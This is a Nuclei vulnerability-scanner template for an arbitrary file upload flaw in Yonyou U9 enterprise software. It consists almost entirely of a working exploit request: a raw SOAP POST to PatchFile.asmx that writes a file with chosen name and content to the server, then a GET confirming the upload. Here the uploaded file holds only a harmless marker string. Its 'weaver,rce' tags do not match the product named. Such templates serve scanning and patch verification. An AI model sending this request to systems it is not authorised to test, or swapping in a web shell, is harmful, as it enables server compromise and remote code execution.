yongyouOA-U9-file-upload.yaml

id: yongyouOA-U9-file-upload
info:
  name: 用友系统-U9企业版存在任意文件上传漏洞
  author: cnaq
  severity: critical
  description: 用友系统-U9企业版存在任意文件上传漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E7%B3%BB%E7%BB%9F-U9%E4%BC%81%E4%B8%9A%E7%89%88%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: weaver,rce

requests:
  - raw:
      - |
        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: .ASPXANONYMOUS=1OJZqnZ03AEkAAAAZGQ2ZDU0NzYtMDdiZS00YWJhLTk2ZTMtNmRhYTgxNDM5OTNi0; ASP.NET_SessionId=md4bw5fgleu1cxfdwk4w0o4n
        Connection: close
        Content-Type: text/xml; charset=utf-8
        Content-Length: 433

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <SaveFile xmlns="http://tempuri.org/">
              <binData>VXBsb2FkLXN1Y2Nlc3NmdWxseQ==</binData>
              <path>./</path>
              <fileName>1233edc.txt</fileName>
            </SaveFile>
          </soap:Body>
        </soap:Envelope>

      - |
        GET /CS/Office/AutoUpdates/1233edc.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'Upload-successfully'